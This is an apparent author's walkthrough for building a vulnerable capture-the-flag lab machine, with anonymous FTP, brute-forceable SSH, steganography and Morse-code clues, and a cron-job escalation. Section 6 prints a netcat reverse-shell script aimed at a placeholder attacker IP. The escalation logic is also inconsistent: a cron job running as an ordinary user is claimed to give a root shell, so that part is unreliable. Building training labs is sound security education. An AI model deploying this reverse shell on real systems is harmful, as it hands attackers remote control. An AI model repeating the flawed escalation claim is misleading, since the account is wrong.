Walkthrough: Creating the Vulnerable Machine

1. System Setup
- Installed a **Linux Ubuntu 14** machine in a virtualized environment.
- Set up **FTP, SSH, and an Apache web server** to serve as attack vectors.
- Created necessary user accounts, including **majorsreekumar69** as the main target user.
- Restricted SSH access for **majorsreekumar69** by setting their shell to `/bin/sh` to limit their interaction.

2. FTP Configuration
- Enabled **anonymous access** in the FTP server.
- Created a file `/var/ftp/hint.txt` containing a **username clue** for SSH.

3. SSH Configuration
- Added an **SSH user**: `majorsreekumar69`.
- Placed a **user flag** at `/home/majorsreekumar69/user.txt`.
- Ensured SSH authentication is password-based, making it vulnerable to **brute force attacks**.

4. Web Server Setup
- Hosted a **fake login page** at `http://<server-ip>/login.html` (a rabbit hole).
- Placed hidden directories that can be discovered using `gobuster` or `dirbuster`:
  - `/var/www/html/encode.jpg` → **Steganography file** (requires a password to decode)
  - `/var/www/html/hint.wav` → **Morse code audio** (contains the password for encode.jpg)

5. Clues Leading to Privilege Escalation
- **Morse code audio (`hint.wav`)**: When decoded, reveals a **password** for the stego file.
- **Steganography file (`encode.jpg`)**: When extracted with `steghide`, reveals a **clue pointing to the cron job location**.

6. Privilege Escalation Setup
- Created a **cron job** as the user (`majorsreekumar69`) that executes `/opt/secret_script.sh` every minute.
- File permissions:
  - `/opt/secret_script.sh` → Owned by `majorsreekumar69`, so it can be edited.
- Content of `/opt/secret_script.sh`:
  ```bash
  #!/bin/bash
  nc -e /bin/bash <attacker-ip> <attacker-port>
  ```
- When the attacker replaces `<attacker-ip>` with their listener's IP and starts `nc -lvnp <port>`, they get a **reverse shell as root**.

7. Root Flag
- The `root.txt` flag is located at `/root/root.txt`.
- Once the attacker gains root access via the cron job exploit, they can read the flag.

---
